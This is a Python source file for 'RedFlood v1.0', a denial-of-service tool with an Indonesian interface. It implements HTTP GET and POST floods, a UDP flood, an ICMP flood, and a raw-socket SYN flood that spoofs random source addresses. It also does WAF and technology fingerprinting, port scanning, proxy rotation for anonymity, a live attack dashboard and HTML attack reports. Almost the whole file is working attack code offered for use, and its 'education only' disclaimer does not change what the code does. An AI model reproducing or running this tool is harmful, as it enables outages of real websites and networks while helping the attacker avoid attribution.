# AUTHOR : Nimendp
# FOLLOW ME : @nimendp (Instagram) | @nimendp (TikTok)
# Noted : Tools ini hanya untuk tujuan pendidikan dan pengujian yang sah. Penggunaan yang tidak sah dapat melanggar hukum dan etika. Author tidak bertanggung jawab atas penyalahgunaan alat ini.
# DILARANG MODIF DAN MENJUAL ALAT INI TANPA IZIN DARI PEMBUAT.
# Cara Jalaninnya Pakai Environment
# python -m venv <nama_environment>
#sudo /mnt/c/Python/myenv/bin/python3 ./redflood.py https://example.com icmp-flood 500 60 | begitu juga dengan syn-flood

import socket
import threading
import time
import os
import random
import datetime
import json
import argparse
import sys
import asyncio
from urllib.parse import urlparse
from collections import deque
from io import BytesIO
import base64
import struct

# --- Wajib Di Install  ---
try:
    import requests
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.text import Text
    from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn
    from rich.markdown import Markdown
    import matplotlib.pyplot as plt
    from h2.connection import H2Connection
    from h2.events import ResponseReceived, DataReceived, StreamEnded
except ImportError as e:
    print(f"Error: Pustaka yang dibutuhkan tidak ditemukan: {e.name}")
    print(f"Silakan install dengan perintah: pip install requests rich matplotlib h2 pysocks")
    sys.exit(1)

# =================================================================================================
# KONFIGURASI & DATABASE LOKAL
# =================================================================================================

TECHNOLOGIES = {
    "Nginx": {"headers": {"Server": "nginx"}}, "Apache": {"headers": {"Server": "Apache"}},
    "LiteSpeed": {"headers": {"Server": "LiteSpeed"}}, "WordPress": {"html": ["wp-content", "wp-includes"]},
    "Joomla": {"html": ["com_content", "/media/com_"]}, "PHP": {"headers": {"X-Powered-By": "PHP"}},
    "Cloudflare": {"headers": {"Server": "cloudflare"}}, "jQuery": {"html": ["jquery.js", "jquery.min.js"]},
    "React": {"html": ["data-reactroot", "react.js", "react.min.js"]}, "Vue.js": {"html": ["data-v-", "vue.js"]},
    "CodeIgniter": {"headers": {"Set-Cookie": "ci_session"}}, "Laravel": {"headers": {"Set-Cookie": "laravel_session"}},
}
HTTP_HEADERS = [
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'DNT': '1', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'},
    {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-gb', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive'},
    {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'}
]
WAF_SIGNATURES = {
    "Cloudflare": ["cloudflare", "cf-ray", "__cfduid"], "Sucuri": ["sucuri/cloudproxy", "X-Sucuri-ID"],
    "Akamai": ["AkamaiGHost", "X-Akamai-Transformed"], "Imperva": ["incapsula", "visid_incap"],
    "Wordfence": ["wordfence_verified", "wf-cookie-check"],
}


# =================================================================================================
# KELAS-KELAS INTI
# =================================================================================================

class UIManager:
    def __init__(self, console: Console):
        self.console = console

    def print_banner(self):
        banner_text = r"""
  
  ______ _      ____   ____  _____    _   _ _____ __  __ ______ _   _ _____  _____  
 |  ____| |    / __ \ / __ \|  __ \  | \ | |_   _|  \/  |  ____| \ | |  __ \|  __ \ 
 | |__  | |   | |  | | |  | | |  | | |  \| | | | | \  / | |__  |  \| | |  | | |__) |
 |  __| | |   | |  | | |  | | |  | | | . ` | | | | |\/| |  __| | . ` | |  | |  ___/ 
 | |    | |___| |__| | |__| | |__| | | |\  |_| |_| |  | | |____| |\  | |__| | |     
 |_|    |______\____/ \____/|_____/  |_| \_|_____|_|  |_|______|_| \_|_____/|_|     
                                                                                    
                                                                                    

        """
        version_text = "RedFlood v1.0  - by nimendp"
        self.console.print(Text(banner_text, style="bold #FF0000"), justify="left")
        self.console.print(Text(version_text, style="italic yellow"), justify="center")
        
    
        disclaimer_content = (
            "[bold yellow]PERINGATAN: Hanya untuk tujuan pendidikan dan pengujian yang sah.[/bold yellow]\n\n"
            "[bold cyan]FOLLOW ME: @nimendp (Github) | @nimendp (Instagram) | @nimendp (TikTok)[/bold cyan]"
        )
        
    
        disclaimer_panel = Panel(
            Text.from_markup(disclaimer_content, justify="center"),
            title="[bold red]DISCLAIMER & AUTHOR[/bold red]",
            border_style="red"
        )
        self.console.print(disclaimer_panel, justify="center")
        self.console.print()

    def interactive_config(self, args, available_modes):
        self.console.print("[bold cyan]--- Konfigurasi Interaktif ---[/bold cyan]")
        args.target = self.console.input("[bold]➡️ Masukkan Target URL/IP: [/bold]")
        self.console.print(f"Mode yang tersedia: [green]{', '.join(available_modes)}[/green]")
        args.mode = self.console.input("[bold]➡️ Masukkan Mode Serangan: [/bold]")
        args.threads = int(self.console.input("[bold]➡️ Jumlah Threads [default: 50]: [/bold]") or "50")
        args.duration = int(self.console.input("[bold]➡️ Durasi (detik) [default: 60]: [/bold]") or "60")
        args.proxy_file = self.console.input("[bold]➡️ File Proxy (opsional): [/bold]") or None
        if not args.proxy_file:
            args.proxy = self.console.input("[bold]➡️ Proxy Tunggal (opsional): [/bold]") or None
        self.console.print("[bold cyan]-----------------------------[/bold cyan]\n")
        return args

    def make_dashboard_layout(self):
        layout = Layout(name="root")
        layout.split(Layout(name="header", size=3), Layout(ratio=1, name="main"), Layout(size=3, name="footer"))
        layout["main"].split_row(Layout(name="side", ratio=1), Layout(name="body", ratio=2))
        layout["side"].split(Layout(name="info"), Layout(name="graph"))
        layout["body"].split(Layout(name="stats"), Layout(name="logs"))
        return layout

    def create_info_panel(self, args):
        info_table = Table.grid(expand=True, padding=(0, 1))
        info_table.add_column(style="cyan", width=15); info_table.add_column(style="white")
        info_table.add_row("🎯 Target", f"[bold green]{args.target}[/bold green]")
        info_table.add_row("💥 Mode", f"[bold yellow]{args.mode.upper()}[/bold yellow]")
        info_table.add_row("⏳ Durasi", f"{args.duration} detik")
        info_table.add_row("🧵 Threads", str(args.threads))
        proxy_display = args.proxy or (f"File: {os.path.basename(args.proxy_file)}" if args.proxy_file else "Tidak Ada")
        info_table.add_row("🛰️ Proxy", f"[magenta]{proxy_display}[/magenta]")
        return Panel(info_table, title="[bold]Info Serangan[/bold]", border_style="blue")

    def create_stats_panel(self, stats):
        stats_table = Table.grid(expand=True, padding=(0, 1))
        stats_table.add_column(style="cyan"); stats_table.add_column(style="magenta", justify="right")
        stats_table.add_row("Total Permintaan", f"{stats.get('permintaan', 0):,}")
        stats_table.add_row("Req/detik (RPS)", f"{stats.get('rps', 0.0):.2f}")
        stats_table.add_row("✅ Berhasil", f"[green]{stats.get('berhasil', 0):,}[/green]")
        stats_table.add_row("❌ Gagal", f"[red]{stats.get('gagal', 0):,}[/red]")
        stats_table.add_row("📤 Data Terkirim", f"{stats.get('data_sent_gb', 0.0):.4f} GB")
        return Panel(stats_table, title="[bold]Statistik Utama[/bold]", border_style="green")

    def create_rps_graph(self, rps_history: deque):
        max_val = max(rps_history) if rps_history else 1
        graph_text = ""
        for val in rps_history:
            bar_len = int((val / max_val) * 25) if max_val > 0 else 0
            graph_text += '█' * bar_len + '\n'
        return Panel(Text(graph_text, style="yellow"), title="[bold]Grafik RPS[/bold]", border_style="yellow")

    def create_log_panel(self, log_history: deque):
        return Panel(Text("\n".join(log_history)), title="[bold]Log Kejadian[/bold]", border_style="red")

class Reconnaissance:
    def __init__(self, ui_manager):
        self.ui = ui_manager

    def run(self, target):
        self.ui.console.print(f"\n[bold blue]--- Memulai Fase Pengintaian untuk {target} ---[/bold blue]")
        is_ip = all(c in "0123456789." for c in target.split(':')[0])
        domain = target if not is_ip else None
        target_url = target if "://" in target else f"http://{target}"
        if not is_ip:
            self.analyze_target(target_url)
            self.scan_ports(urlparse(target_url).netloc)
        else:
            self.ui.console.print(Panel(f"Target adalah IP. Melewati analisis HTTP. Memindai port pada {target}...", border_style="yellow"))
            self.scan_ports(target)

    def analyze_target(self, target_url):
        try:
            response = requests.get(target_url, headers=random.choice(HTTP_HEADERS), timeout=10, verify=False)
            content = f"Status Awal: [green]{response.status_code}[/green]\n"
            content += f"Server: [cyan]{response.headers.get('Server', 'N/A')}[/cyan]\n"
            detected_waf = "Tidak ada"
            full_response_text = str(response.headers).lower() + response.text.lower()
            for waf, sigs in WAF_SIGNATURES.items():
                if any(s in full_response_text for s in sigs):
                    detected_waf = f"[bold red]{waf}[/bold red]"; break
            content += f"WAF Terdeteksi: {detected_waf}\n\n[bold]Teknologi Terdeteksi (Lokal):[/bold]\n"
            detected_techs = []
            for tech_name, tech_data in TECHNOLOGIES.items():
                if 'headers' in tech_data:
                    for header, pattern in tech_data['headers'].items():
                        if header in response.headers and pattern in response.headers[header]: detected_techs.append(tech_name)
                if 'html' in tech_data:
                    for pattern in tech_data['html']:
                        if pattern in response.text: detected_techs.append(tech_name)
            content += f"[cyan]{', '.join(set(detected_techs)) or 'Tidak ada'}[/cyan]"
            self.ui.console.print(Panel(content, title="Analisis Target", border_style="green"))
        except requests.RequestException:
            self.ui.console.print(Panel("[bold red]Gagal menghubungi target untuk analisis HTTP.[/bold red]", border_style="red"))

    def scan_ports(self, domain):
        open_ports, common_ports = [], [21, 22, 25, 80, 443, 3306, 8080, 8443]
        target_ip = domain.split(':')[0]
        with self.ui.console.status("[bold yellow]Memindai port umum...[/bold yellow]", spinner="dots") as status:
            try:
                ip = socket.gethostbyname(target_ip)
                for port in common_ports:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                        sock.settimeout(0.5)
                        if sock.connect_ex((ip, port)) == 0: open_ports.append(str(port))
            except socket.gaierror:
                self.ui.console.print(f"[red]Error: Tidak dapat menemukan host {domain}[/red]"); return
        self.ui.console.print(Panel(f"Port Terbuka: [bold green]{', '.join(open_ports) if open_ports else 'Tidak ada'}[/bold green]", title="Pemindaian Port", border_style="magenta"))

class PayloadGenerator:
    def generate_json(self): return json.dumps({"user": f"u_{random.randint(1,999)}", "ts": time.time()})
    def generate_form(self): return {"user": f"u_{random.randint(1,999)}", "pass": "p_12345"}
    def generate_bytes(self, size=1024): return os.urandom(size)

class Reporter:
    def generate(self, args, stats, rps_history):
        plt.style.use('dark_background')
        fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(15, 6))
        ax1.plot(range(len(rps_history)), list(rps_history), color='cyan', marker='o', linestyle='--')
        ax1.set_title('RPS vs Waktu', fontsize=16, color='white'); ax1.set_xlabel('Waktu (detik)', color='white'); ax1.set_ylabel('RPS', color='white'); ax1.grid(True, linestyle='--', alpha=0.3)
        sizes = [stats.get("berhasil", 0), stats.get("gagal", 1)]
        ax2.pie(sizes, labels=['Berhasil', 'Gagal'], autopct='%1.1f%%', startangle=90, colors=['#2ca02c', '#d62728'], wedgeprops={'edgecolor': 'white'})
        ax2.axis('equal'); ax2.set_title('Distribusi Permintaan', fontsize=16, color='white')
        buf = BytesIO(); plt.savefig(buf, format='png', transparent=True); chart_base64 = base64.b64encode(buf.getvalue()).decode('utf-8'); buf.close(); plt.close(fig)
        target_name = urlparse(args.target).netloc
        html_template = f"""
        <!DOCTYPE html><html><head><title>Laporan Serangan RedFlood v1.0 - By Nimendp</title><style>body{{font-family: 'Segoe UI', sans-serif; background-color: #1e1e1e; color: #d4d4d4; padding: 20px;}} .container{{max-width: 1200px; margin: auto; background-color: #252526; padding: 30px; border-radius: 8px; border: 1px solid #333;}} h1{{color: #d74c4c; border-bottom: 2px solid #d74c4c; padding-bottom: 10px;}} h2{{color: #4ec9b0;}} .stats-grid{{display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-top: 20px;}} .stat-card{{background-color: #2d2d2d; padding: 20px; border-radius: 5px; text-align: center; border-left: 5px solid #d74c4c;}} .stat-card h3{{margin-top: 0; color: #cccccc;}} .stat-card p{{font-size: 2em; margin-bottom: 0; color: #4ec9b0; font-weight: bold;}} .chart-container{{margin-top: 40px; text-align: center; background-color: #2d2d2d; padding: 20px; border-radius: 5px;}} img{{max-width: 100%; height: auto; border-radius: 5px;}}</style></head><body><div class="container"><h1>Laporan Serangan RedFlood v1.0 - By Nimendp</h1><h2>Ringkasan Eksekusi</h2><div class="stats-grid"><div class="stat-card"><h3>Target</h3><p>{args.target}</p></div><div class="stat-card"><h3>Mode</h3><p>{args.mode.upper()}</p></div><div class="stat-card"><h3>Durasi</h3><p>{args.duration}s</p></div><div class="stat-card"><h3>Threads</h3><p>{args.threads}</p></div><div class="stat-card"><h3>Total Permintaan</h3><p>{stats.get("permintaan", 0):,}</p></div><div class="stat-card"><h3>Rata-rata RPS</h3><p>{stats.get("rps", 0):.2f}</p></div></div><div class="chart-container"><h2>Visualisasi Data Serangan</h2><img src="data:image/png;base64,{chart_base64}" alt="Grafik Serangan"></div></div></body></html>
        """
        report_path = f"RedFlood_Report_{target_name.replace('.', '_')}_{datetime.datetime.now():%Y%m%d_%H%M}.html"
        with open(report_path, "w", encoding='utf-8') as f: f.write(html_template)
        return report_path

class ProxyManager:
    def __init__(self, ui_manager):
        self.ui = ui_manager
        self.proxies = []
    def load_from_file(self, filename):
        try:
            with open(filename, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            self.ui.console.print(f"[green]Berhasil memuat {len(self.proxies)} proxy dari {filename}[/green]")
        except FileNotFoundError:
            self.ui.console.print(f"[red]Error: File proxy '{filename}' tidak ditemukan.[/red]"); self.proxies = []
    def get_proxy(self):
        return random.choice(self.proxies) if self.proxies else None


# =================================================================================================
# KELAS-KELAS SERANGAN 
# =================================================================================================

class BaseAttack:
    def __init__(self, args, ui_manager, proxy_manager=None):
        self.args = args; self.ui = ui_manager
        self.proxy_manager = proxy_manager or ProxyManager(ui_manager)
        self.target_url = urlparse(args.target if "://" in args.target else f"http://{args.target}")
        self.target_host = self.target_url.netloc or args.target
        self.port = args.port or self.target_url.port or (443 if self.target_url.scheme == 'https' else 80)
        self.stats = {"permintaan": 0, "berhasil": 0, "gagal": 0, "rps": 0.0, "data_sent_gb": 0.0}
        self.log_history = deque(maxlen=10); self.rps_history = deque(maxlen=30)
        self.running = False; self.threads = []
        self.target_ip = self._resolve_target()

    def _resolve_target(self):
        try: return socket.gethostbyname(self.target_host.split(':')[0])
        except socket.gaierror:
            self.ui.console.print(f"[bold red]Error: Tidak dapat menemukan host {self.target_host}[/bold red]"); return None

    def run(self):
        if not self.target_ip: return
        self.running = True
        for _ in range(self.args.threads):
            thread = threading.Thread(target=self.worker, daemon=True)
            self.threads.append(thread); thread.start()
        self._live_display()
        self.stop()

    def stop(self):
        self.running = False
        for thread in self.threads: thread.join(timeout=0.2)

    def _live_display(self):
        layout = self.ui.make_dashboard_layout()
        layout["header"].update(Panel(Text("RedFlood v1.0 - Live Attack Dashboard", justify="center", style="bold red")))
        info_panel = Panel(self.ui.create_info_panel(self.args).renderable, title="[bold]Info Serangan[/bold]", border_style="blue")
        stats_panel = Panel(self.ui.create_stats_panel(self.stats).renderable, title="[bold]Statistik Utama[/bold]", border_style="green")
        graph_panel = Panel(self.ui.create_rps_graph(self.rps_history).renderable, title="[bold]Grafik RPS[/bold]", border_style="yellow")
        logs_panel = Panel(self.ui.create_log_panel(self.log_history).renderable, title="[bold]Log Kejadian[/bold]", border_style="red")
        layout["info"].update(info_panel); layout["stats"].update(stats_panel)
        layout["graph"].update(graph_panel); layout["logs"].update(logs_panel)
        progress = Progress(TextColumn("{task.description}"), BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", "•", TextColumn("{task.fields[time_left]}"))
        task_id = progress.add_task("[green]Durasi", total=self.args.duration, time_left=f"{self.args.duration}s")
        layout["footer"].update(progress)
        with Live(layout, screen=False, redirect_stderr=False, refresh_per_second=4, vertical_overflow="visible") as live:
            start_time = time.time()
            while self.running:
                elapsed = time.time() - start_time
                if elapsed >= self.args.duration: break
                self.stats["rps"] = self.stats["permintaan"] / elapsed if elapsed > 0 else 0.0
                self.rps_history.append(self.stats["rps"])
                stats_panel.renderable = self.ui.create_stats_panel(self.stats).renderable
                graph_panel.renderable = self.ui.create_rps_graph(self.rps_history).renderable
                logs_panel.renderable = self.ui.create_log_panel(self.log_history).renderable
                progress.update(task_id, advance=elapsed - progress.tasks[task_id].completed, time_left=f"{int(self.args.duration - elapsed)}s tersisa")
                time.sleep(0.25)
    
    def worker(self): raise NotImplementedError

class HTTPGetAttack(BaseAttack):
    def worker(self):
        session = requests.Session(); proxy = self.proxy_manager.get_proxy()
        if proxy: session.proxies = {"http": proxy, "https": proxy}
        while self.running:
            try:
                url = f"{self.target_url.scheme}://{self.target_host}:{self.port}/?{random.randint(1000, 99999)}"
                session.get(url, headers=random.choice(HTTP_HEADERS), timeout=5, verify=False)
                self.stats["berhasil"] += 1
            except requests.RequestException: self.stats["gagal"] += 1
            self.stats["permintaan"] += 1

class GoldenEyeAttack(BaseAttack):
    def worker(self):
        session = requests.Session(); proxy = self.proxy_manager.get_proxy()
        if proxy: session.proxies = {"http": proxy, "https": proxy}
        while self.running:
            try:
                headers = random.choice(HTTP_HEADERS); headers['Connection'] = 'keep-alive'
                headers['Content-Length'] = str(random.randint(5000, 10000))
                url = f"{self.target_url.scheme}://{self.target_host}:{self.port}/?{random.randint(1000, 99999)}"
                session.post(url, headers=headers, timeout=5, verify=False); self.stats["berhasil"] += 1
            except requests.RequestException: self.stats["gagal"] += 1
            self.stats["permintaan"] += 1

class UDPFloodAttack(BaseAttack):
    def worker(self):
        try: sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); payload = os.urandom(1024)
        except Exception as e:
            if self.running: self.log_history.append(f"[ERROR] UDP Socket: {e}"); self.stop()
            return
        while self.running:
            try:
                sock.sendto(payload, (self.target_ip, self.port)); self.stats["permintaan"] += 1; self.stats["berhasil"] += 1
                self.stats["data_sent_gb"] += len(payload) / (1024**3)
            except Exception: self.stats["gagal"] += 1

class ICMPEchoAttack(BaseAttack):
    def _checksum(self, source_string):
        sum = 0; countTo = (len(source_string) // 2) * 2; count = 0
        while count < countTo:
            thisVal = source_string[count+1] * 256 + source_string[count]; sum += thisVal; sum &= 0xffffffff; count += 2
        if countTo < len(source_string): sum += source_string[len(source_string) - 1]; sum &= 0xffffffff
        sum = (sum >> 16) + (sum & 0xffff); sum += (sum >> 16); answer = ~sum; answer &= 0xffff
        return answer >> 8 | (answer << 8 & 0xff00)

    def worker(self):
        try: sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            if self.running: self.log_history.append("[FATAL] ICMP Flood butuh hak akses root/sudo!"); self.stop()
            return
        while self.running:
            try:
                packet_id = int((id(threading.current_thread()) * random.random()) % 65535)
                header = struct.pack("bbHHh", 8, 0, 0, packet_id, 1); data = (192 - len(header)) * b'Q'
                my_checksum = self._checksum(header + data)
                header = struct.pack("bbHHh", 8, 0, socket.htons(my_checksum), packet_id, 1)
                sock.sendto(header + data, (self.target_ip, self.port)); self.stats["permintaan"] += 1; self.stats["berhasil"] += 1
            except Exception: self.stats["gagal"] += 1
                
class SYNFloodAttack(BaseAttack):
    def worker(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            if self.running: self.log_history.append("[FATAL] Butuh hak akses root/sudo!"); self.stop()
            return
        while self.running:
            source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
            ip_header = self._create_ip_header(source_ip, self.target_ip)
            tcp_header = self._create_tcp_header(source_ip, self.target_ip)
            sock.sendto(ip_header + tcp_header, (self.target_ip, self.port))
            self.stats["permintaan"] += 1; self.stats["berhasil"] += 1
    def _checksum(self, msg):
        s=0;
        for i in range(0,len(msg),2):s+=msg[i]+(msg[i+1]<<8)
        s=(s>>16)+(s&0xffff);s+=(s>>16);return ~s&0xffff
    def _create_ip_header(self, source_ip, dest_ip):
        ihl,v,tos,l,id=5,4,0,40,random.randint(1,65535);f,t,p,c=0,255,socket.IPPROTO_TCP,0
        s,d=socket.inet_aton(source_ip),socket.inet_aton(dest_ip);iv=(v<<4)+ihl
        h=struct.pack('!BBHHHBBH4s4s',iv,tos,l,id,f,t,p,c,s,d);c=self._checksum(h)
        return struct.pack('!BBHHHBBH4s4s',iv,tos,l,id,f,t,p,socket.htons(c),s,d)
    def _create_tcp_header(self, source_ip, dest_ip):
        sp,dp=random.randint(1024,65535),self.port;seq,ack,doff=random.randint(0,2**32-1),0,5
        w,c,u=socket.htons(5840),0,0;f,s,r,p,a,ug=0,1,0,0,0,0;off=(doff<<4)+0
        fl=f+(s<<1)+(r<<2)+(p<<3)+(a<<4)+(ug<<5)
        psh=struct.pack('!4s4sBBH',socket.inet_aton(source_ip),socket.inet_aton(dest_ip),0,socket.IPPROTO_TCP,20)
        tcph=struct.pack('!HHLLBBHHH',sp,dp,seq,ack,off,fl,w,c,u);c=self._checksum(psh+tcph)
        return struct.pack('!HHLLBBHHH',sp,dp,seq,ack,off,fl,w,c,u)

# =================================================================================================
# KELAS KONTROLER UTAMA
# =================================================================================================

class RedFloodExecutor:
    def __init__(self):
        self.console = Console()
        self.ui = UIManager(self.console)
        self.recon = Reconnaissance(self.ui)
        self.proxy_manager = ProxyManager(self.ui)
        self.reporter = Reporter()
        self.attack_classes = self._load_attack_classes()
        self.args = None

    def _load_attack_classes(self):
        return {
            "http-get": HTTPGetAttack, "goldeneye": GoldenEyeAttack,
            "udp-flood": UDPFloodAttack, "icmp-flood": ICMPEchoAttack,
            "syn-flood": SYNFloodAttack,
        }

    def run(self):
        self.ui.print_banner()
        parser = self._create_parser()
        self.args = parser.parse_args()
        if self.args.proxy_file: self.proxy_manager.load_from_file(self.args.proxy_file)
        elif self.args.proxy: self.proxy_manager.proxies = [self.args.proxy]
        if not self.args.target:
            self.args = self.ui.interactive_config(self.args, list(self.attack_classes.keys()))
        if self.args.recon_only:
            self.recon.run(self.args.target); return
        if self.args.mode not in self.attack_classes:
            self.console.print(f"[bold red]Error: Mode serangan '{self.args.mode}' tidak valid.[/bold red]"); return
        self.recon.run(self.args.target)
        if not self.console.input("[bold yellow]Lanjutkan serangan? (y/n): [/bold yellow]").lower() == 'y':
            self.console.print("[bold]Serangan dibatalkan.[/bold]"); return
        attack_class = self.attack_classes[self.args.mode]
        attack_instance = attack_class(self.args, self.ui, self.proxy_manager)
        attack_instance.run()
        self.console.print("\n[bold green]Membuat Laporan Serangan...[/bold green]")
        try:
            report_path = self.reporter.generate(self.args, attack_instance.stats, attack_instance.rps_history)
            self.console.print(f"[bold green]Laporan disimpan ke: {report_path}[/bold green]")
        except Exception as e:
            self.console.print(f"[bold red]Gagal membuat laporan: {e}[/bold red]")
        
    def _create_parser(self):
        parser = argparse.ArgumentParser(
            description="RedFlood v1.0 ", formatter_class=argparse.RawTextHelpFormatter,
            epilog=f"""Contoh Penggunaan:
  Mode Interaktif    : ./{os.path.basename(__file__)}
  Serangan Langsung    : ./{os.path.basename(__file__)} <target> <mode> <threads> <duration>
  Contoh             : ./{os.path.basename(__file__)} http://example.com http-get 200 120
  Serangan SYN (Root): sudo ./{os.path.basename(__file__)} 1.2.3.4 syn-flood 10 60
  Hanya Recon        : ./{os.path.basename(__file__)} <target> --recon-only
"""
        )
        parser.add_argument("target", nargs='?', default=None, help="URL atau IP target.")
        parser.add_argument("mode", nargs='?', default=None, help=f"Mode serangan. Tersedia: {', '.join(self._load_attack_classes().keys())}")
        parser.add_argument("threads", nargs='?', type=int, default=50, help="Jumlah threads.")
        parser.add_argument("duration", nargs='?', type=int, default=60, help="Durasi serangan dalam detik.")
        parser.add_argument("-p", "--port", type=int, help="Port target spesifik (opsional).")
        parser.add_argument("--proxy", help="Gunakan proxy tunggal (contoh: socks5h://127.0.0.1:9050).")
        parser.add_argument("--proxy-file", help="Gunakan daftar proxy dari file teks.")
        parser.add_argument("--recon-only", action="store_true", help="Hanya jalankan fase pengintaian.")
        return parser

# =================================================================================================
# TITIK MASUK PROGRAM
# =================================================================================================

def main():
    app = RedFloodExecutor()
    try: app.run()
    except KeyboardInterrupt: Console().print("\n\n[bold red]Program dihentikan oleh pengguna.[/bold red]")
    except Exception as e:
        Console().print(f"\n\n[bold red]Terjadi error fatal: {e}[/bold red]")
        # import traceback; traceback.print_exc() # Uncomment untuk debugging mendalam
    finally:
        Console().print("[bold]Aplikasi RedFlood ditutup.[/bold]")

if __name__ == "__main__":
    is_l4_attack = any(m in sys.argv for m in ['syn-flood', 'udp-flood', 'icmp-flood'])
    if is_l4_attack and os.name == 'posix' and os.geteuid() != 0:
        Console().print("[bold red][FATAL] Mode serangan ini memerlukan hak akses root. Jalankan dengan 'sudo'.[/bold red]")
        sys.exit(1)
    main()